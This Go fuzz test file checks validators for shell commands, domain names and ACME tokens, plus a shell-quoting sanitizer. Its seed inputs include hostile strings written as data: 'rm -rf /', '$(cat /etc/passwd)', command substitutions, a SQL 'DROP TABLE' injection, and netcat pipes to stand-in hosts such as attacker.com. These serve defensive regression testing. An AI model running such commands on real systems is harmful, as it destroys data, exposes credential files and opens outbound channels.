package validation

import (
	"strings"
	"testing"
)

func FuzzValidateShellCommand(f *testing.F) {
	f.Add("nginx -s reload")
	f.Add("systemctl restart apache2")
	f.Add("echo hello; rm -rf /")
	f.Add("$(whoami)")
	f.Add("")
	f.Add("valid-command")
	f.Add("/usr/bin/openssl")
	f.Add("certctl-agent")
	f.Add("; rm -rf /")
	f.Add("| nc attacker.com 1234")
	f.Add("`whoami`")
	f.Add("$(cat /etc/passwd)")
	f.Fuzz(func(t *testing.T, cmd string) {
		// Should never panic, only return error for invalid input
		_ = ValidateShellCommand(cmd)
	})
}

func FuzzValidateDomainName(f *testing.F) {
	f.Add("example.com")
	f.Add("*.example.com")
	f.Add("a.b.c.d.example.co.uk")
	f.Add("")
	f.Add("; rm -rf /")
	f.Add("example.com; DROP TABLE certificates;")
	f.Add("*.*.example.com")
	f.Add("example..com")
	f.Add("-example.com")
	f.Add("example-.com")
	f.Add("sub domain.com")
	f.Add("@example.com")
	f.Add("example.com/admin")
	f.Add("//example.com")
	f.Fuzz(func(t *testing.T, domain string) {
		// Should never panic, only return error for invalid input
		_ = ValidateDomainName(domain)
	})
}

func FuzzValidateACMEToken(f *testing.F) {
	f.Add("validtoken123")
	f.Add("token-with-dash")
	f.Add("token_with_underscore")
	f.Add("")
	f.Add("token;invalid")
	f.Add("token|invalid")
	f.Add("token$(whoami)")
	f.Add("token\ninjection")
	f.Add("token with spaces")
	f.Fuzz(func(t *testing.T, token string) {
		// Should never panic, only return error for invalid input
		_ = ValidateACMEToken(token)
	})
}

// FuzzSanitizeForShell pins SanitizeForShell's "no panic + output is
// shell-safe" invariant. The function wraps input in POSIX single-quotes
// with escapes for embedded `'`. Bundle O.2 adds this target so any
// adversarial unicode / NUL / control-byte / shell-metachar input is
// regression-tested against the wrap contract.
func FuzzSanitizeForShell(f *testing.F) {
	seeds := []string{
		"",
		"plain",
		"with space",
		"with'apostrophe",
		"with\"double-quote",
		"with$dollar",
		"with`backtick`",
		"with\nnewline",
		"with\ttab",
		"with\x00nul",
		"; rm -rf /",
		"$(whoami)",
		"`whoami`",
		"|nc evil.example.com 1234",
		"unicode: 你好世界",
		strings.Repeat("'", 100),
		strings.Repeat("a", 10000),
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, input string) {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("panic on input %q: %v", input, r)
			}
		}()
		out := SanitizeForShell(input)
		// Invariants:
		//   1. Output is non-empty (always at least the surrounding quotes)
		//   2. Output starts and ends with a single quote
		if len(out) < 2 {
			t.Fatalf("output %q too short for input %q", out, input)
		}
		if out[0] != '\'' || out[len(out)-1] != '\'' {
			t.Fatalf("output %q does not begin+end with single-quote for input %q", out, input)
		}
	})
}
